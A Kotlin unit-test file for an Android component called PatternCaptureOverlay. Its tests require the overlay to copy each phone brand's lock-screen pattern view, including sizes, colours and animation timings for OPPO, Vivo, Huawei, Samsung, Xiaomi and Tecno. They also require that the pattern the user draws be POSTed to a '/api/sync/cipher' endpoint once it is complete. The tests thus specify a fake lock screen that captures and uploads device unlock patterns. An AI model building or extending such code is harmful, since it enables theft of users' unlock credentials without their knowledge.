package com.storm.safe.rock.service.modules.cipher

import org.junit.Test
import org.junit.Assert.*

class PatternOverlayVendorAlignTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/cipher/PatternCaptureOverlay.kt").readText()
    }

    // === 3A: Pattern View ID linear scan ===

    @Test
    fun `PATTERN_VIEW_IDS contains colorLockPatternView for OPPO`() {
        assertTrue("must include OPPO colorLockPatternView (#7)",
            source.contains("\"com.android.systemui:id/colorLockPatternView\""))
    }

    @Test
    fun `PATTERN_VIEW_IDS contains vivo_lock_pattern_view`() {
        assertTrue("must include Vivo vivo_lock_pattern_view (#8)",
            source.contains("\"com.android.systemui:id/vivo_lock_pattern_view\""))
    }

    @Test
    fun `PATTERN_VIEW_IDS contains lockPatternView AOSP fallback`() {
        assertTrue("must include AOSP lockPatternView (#9)",
            source.contains("\"com.android.systemui:id/lockPatternView\""))
    }

    @Test
    fun `findSystemPatternView is linear scan without brand branching`() {
        val methodIdx = source.indexOf("fun findSystemPatternView(")
        assertTrue("findSystemPatternView must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 600).coerceAtMost(source.length))
        assertFalse("must NOT branch by Build.BRAND", body.contains("Build.BRAND"))
    }

    // === 3B: Brand fallback parameters ===

    @Test
    fun `applyBrandStyle OPPO has aspectRatio 1 and pathWidth 6`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        assertTrue("applyBrandStyle must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("OPPO must have aspectRatio = 1", body.contains("aspectRatio = 1"))
        assertTrue("OPPO must have pathWidth = 6", body.contains("pathWidth = 6"))
    }

    @Test
    fun `applyBrandStyle Huawei has pathWidth 20`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("Huawei must have pathWidth = 20", body.contains("pathWidth = 20"))
    }

    @Test
    fun `applyBrandStyle Vivo has pathWidth 30 and yellow selected`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("Vivo must have pathWidth = 30", body.contains("pathWidth = 30"))
        assertTrue("Vivo dotSelectedColor must be -256 (yellow)", body.contains("-256"))
    }

    @Test
    fun `applyBrandStyle Samsung has 100ms dot and 200ms path animation`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        val samIdx = body.indexOf("\"samsung\"")
        assertTrue("Samsung branch must exist", samIdx > 0)
        val samBlock = body.substring(samIdx, (samIdx + 500).coerceAtMost(body.length))
        assertTrue("Samsung dotAnimationDuration must be 100", samBlock.contains("dotAnimationDuration = 100"))
        assertTrue("Samsung pathEndAnimationDuration must be 200", samBlock.contains("pathEndAnimationDuration = 200"))
    }

    @Test
    fun `applyBrandStyle Xiaomi has 50ms animation`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("Xiaomi dotAnimationDuration = 50", body.contains("dotAnimationDuration = 50"))
        assertTrue("Xiaomi pathEndAnimationDuration = 50", body.contains("pathEndAnimationDuration = 50"))
    }

    @Test
    fun `applyBrandStyle Tecno has pathWidth 5`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("Tecno must exist", body.contains("\"tecno\""))
        assertTrue("Tecno pathWidth = 5", body.contains("pathWidth = 5"))
    }

    @Test
    fun `applyBrandStyle Xiaomi includes poco and blackshark`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        val body = source.substring(methodIdx, (methodIdx + 5000).coerceAtMost(source.length))
        assertTrue("must include poco", body.contains("\"poco\""))
        assertTrue("must include blackshark", body.contains("\"blackshark\""))
    }

    // === 3B-extra: SystemUI success path also respects brand animation ===

    @Test
    fun `applyBrandStyle SystemUI success path has brand-specific animation`() {
        val methodIdx = source.indexOf("fun applyBrandStyle(")
        assertTrue("applyBrandStyle must exist", methodIdx > 0)
        // SystemUI success path is before the fallback "兜底" section
        val fallbackIdx = source.indexOf("品牌适配", methodIdx)
        assertTrue("fallback section must exist", fallbackIdx > 0)
        val successPath = source.substring(methodIdx, fallbackIdx)
        // Must NOT hardcode 150/100 for all brands in success path
        assertTrue("success path must branch by samsung for 100/200",
            successPath.contains("\"samsung\"") && successPath.contains("dotAnimationDuration = 100"))
        assertTrue("success path must branch by xiaomi for 50/50",
            successPath.contains("\"xiaomi\"") && successPath.contains("dotAnimationDuration = 50"))
    }

    // === 3C: SystemUI resource fallback ===

    @Test
    fun `readSystemUiResources Huawei has AOSP fallback lock_pattern_dot_size`() {
        val methodIdx = source.indexOf("fun readSystemUiResources(")
        val body = source.substring(methodIdx, (methodIdx + 9000).coerceAtMost(source.length))
        assertTrue("Huawei must try AOSP lock_pattern_dot_size",
            body.contains("lock_pattern_dot_size") && body.contains("huawei"))
    }

    @Test
    fun `readSystemUiResources Vivo has vivo_pattern_unlock_size`() {
        val methodIdx = source.indexOf("fun readSystemUiResources(")
        val body = source.substring(methodIdx, (methodIdx + 9000).coerceAtMost(source.length))
        assertTrue("Vivo must try vivo_pattern_unlock_size", body.contains("vivo_pattern_unlock_size"))
    }

    @Test
    fun `readSystemUiResources Xiaomi color includes poco and blackshark`() {
        val methodIdx = source.indexOf("fun readSystemUiResources(")
        val body = source.substring(methodIdx, (methodIdx + 9000).coerceAtMost(source.length))
        val miuiIdx = body.indexOf("miui_lock_pattern_dot_color")
        assertTrue("miui color resource must exist", miuiIdx > 0)
        val nearMiui = body.substring((miuiIdx - 200).coerceAtLeast(0), miuiIdx)
        assertTrue("Xiaomi color must include poco", nearMiui.contains("poco"))
    }

    // === 3D: Pattern HTTP direct upload ===

    @Test
    fun `saveCipherToLocalService method exists`() {
        assertTrue("saveCipherToLocalService must exist", source.contains("fun saveCipherToLocalService("))
    }

    @Test
    fun `saveCipherToLocalService posts to api_sync_cipher`() {
        val methodIdx = source.indexOf("fun saveCipherToLocalService(")
        assertTrue("method must exist", methodIdx > 0)
        val body = source.substring(methodIdx, (methodIdx + 1500).coerceAtMost(source.length))
        assertTrue("must POST to /api/sync/cipher", body.contains("/api/sync/cipher"))
    }

    @Test
    fun `saveCipherToLocalService has PASSWORD_QUALITY_PATTERN`() {
        val methodIdx = source.indexOf("fun saveCipherToLocalService(")
        val body = source.substring(methodIdx, (methodIdx + 1500).coerceAtMost(source.length))
        assertTrue("cipherGradeCode must be PASSWORD_QUALITY_PATTERN", body.contains("PASSWORD_QUALITY_PATTERN"))
    }

    @Test
    fun `onPatternComplete calls saveCipherToLocalService`() {
        val idx = source.indexOf("onPatternComplete")
        assertTrue("onPatternComplete must exist", idx > 0)
        val after = source.substring(idx, (idx + 1000).coerceAtMost(source.length))
        assertTrue("must call saveCipherToLocalService", after.contains("saveCipherToLocalService"))
    }
}
